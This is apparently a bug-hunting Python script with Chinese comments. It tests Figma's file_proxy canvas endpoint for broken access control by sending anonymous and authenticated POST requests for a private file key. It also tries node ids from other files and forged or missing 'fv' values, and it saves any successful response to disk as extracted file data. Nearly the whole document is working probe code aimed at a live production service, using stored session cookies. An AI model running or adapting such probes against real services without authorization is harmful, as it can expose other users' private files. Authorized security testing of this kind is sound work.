"""POST /api/file_proxy/file/{key}/canvas?nodes_to_extract= 测试

JS 330361 模块（确定性来源）：
  POST /api/file_proxy/file/{fileKey}/canvas?nodes_to_extract={逗号分隔node id}
  body: {"fv": "101"}  (arraybuffer 响应)

创造目标：
  1. 接口级遗漏：匿名 POST 私有文件 key → 若 200 = 私有文件节点数据提取
  2. 对象级遗漏：nodes_to_extract 是否校验节点属于该文件（跨文件 node id）
  3. fv 是否可省略/伪造
"""
import json, sys
import requests

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

SESS = json.load(open(r"D:\scan\_figma_hunt\figma_session.json"))
CK = {c["name"]: c["value"] for c in SESS if c.get("name") and c.get("value")}
UA = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36",
    "Content-Type": "application/json",
}

PRIVATE = "qzDqStIDJyGbthpKiuvfwg"   # 私有文件，owner 是新账号
PUBLIC = "bv2nMIdFf4u3dESGail4sm"     # 公开文件

CASES = [
    ("匿名+私有+本文件节点", None, PRIVATE, ["116:2", "116:7"]),
    ("登录+私有+本文件节点", CK, PRIVATE, ["116:2", "116:7"]),
    ("匿名+私有+无节点", None, PRIVATE, None),
    ("登录+私有+无节点", CK, PRIVATE, None),
    ("登录+私有+跨文件节点(公开文件节点)", CK, PRIVATE, ["0:1", "0:2"]),
    ("登录+公开+公开文件节点", CK, PUBLIC, ["0:1"]),
    ("匿名+公开+公开文件节点", None, PUBLIC, ["0:1"]),
    ("登录+私有+乱节点id", CK, PRIVATE, ["9999999999:999"]),
]


def test(name, ck, file_key, nodes):
    q = f"?nodes_to_extract={','.join(nodes)}" if nodes else ""
    u = f"https://www.figma.com/api/file_proxy/file/{file_key}/canvas{q}"
    try:
        r = requests.post(u, cookies=ck, headers=UA, json={"fv": "101"}, timeout=20)
        body = r.content
        info = f"{len(body)}B ct={r.headers.get('Content-Type','')}"
        if "json" in r.headers.get("Content-Type", ""):
            info += " " + body[:200].decode(errors="replace").replace("\n", " ")
        elif body[:8] == b"<!DOCTYPE":
            info += " (SPA HTML)"
        else:
            info += " magic=" + body[:16].hex()
        print(f"  {r.status_code} | {info}")
        if r.status_code == 200 and body[:8] != b"<!DOCTYPE":
            open(f"file_proxy_{file_key}_{len(nodes) or 0}nodes.bin", "wb").write(body)
        return r.status_code, body
    except Exception as e:
        print(f"  ERR {type(e).__name__} {e}")
        return None, None


print("=== POST file_proxy/file canvas 测试 ===")
for name, ck, fk, nodes in CASES:
    print(f"\n{name}")
    test(name, ck, fk, nodes)

# fv 变体：无 fv / 错误 fv / 别的数字
print("\n=== fv 参数变体（登录+私有+本文件节点） ===")
for fv in [None, "101", "0", "2354398731758506841", "abc"]:
    q = "?nodes_to_extract=116:2"
    u = f"https://www.figma.com/api/file_proxy/file/{PRIVATE}/canvas{q}"
    try:
        r = requests.post(u, cookies=CK, headers=UA, json={"fv": fv} if fv else {}, timeout=20)
        body = r.content
        info = f"{len(body)}B"
        if "json" in r.headers.get("Content-Type", ""):
            info += " " + body[:120].decode(errors="replace").replace("\n", " ")
        else:
            info += " magic=" + body[:12].hex()
        print(f"  fv={fv}: {r.status_code} | {info}")
    except Exception as e:
        print(f"  fv={fv}: ERR {type(e).__name__}")
